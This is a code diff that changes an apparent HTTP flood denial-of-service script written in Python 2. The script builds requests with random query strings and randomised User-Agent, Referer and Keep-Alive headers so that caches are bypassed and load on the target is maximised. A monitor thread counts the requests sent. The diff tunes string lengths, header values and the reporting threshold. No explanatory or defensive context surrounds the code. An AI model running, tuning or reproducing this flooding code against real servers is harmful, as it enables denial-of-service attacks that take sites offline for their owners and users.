@@ -64,7 +64,7 @@ def referer_list():
 def buildblock(size):
 	out_str = ''
 	for i in range(0, size):
-		a = random.randint(275, 300)
+		a = random.randint(95, 120)
 		out_str += chr(a)
 	return(out_str)
 
@@ -84,12 +84,12 @@ def httpcall(url):
 		param_joiner="&"
 	else:
 		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(25,37)) + '=' + buildblock(random.randint(25,37)))
+	request = urllib2.Request(url + param_joiner + buildblock(random.randint(4,20)) + '=' + buildblock(random.randint(4,20)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(90,95)))
-	request.add_header('Keep-Alive', random.randint(300,310))
+	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(35,45)))
+	request.add_header('Keep-Alive', random.randint(180,190))
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
@@ -124,7 +124,7 @@ class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if (previous+100000000<request_counter) & (previous<>request_counter):
+			if (previous+1000000<request_counter) & (previous<>request_counter):
 				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
 		if flag==2:
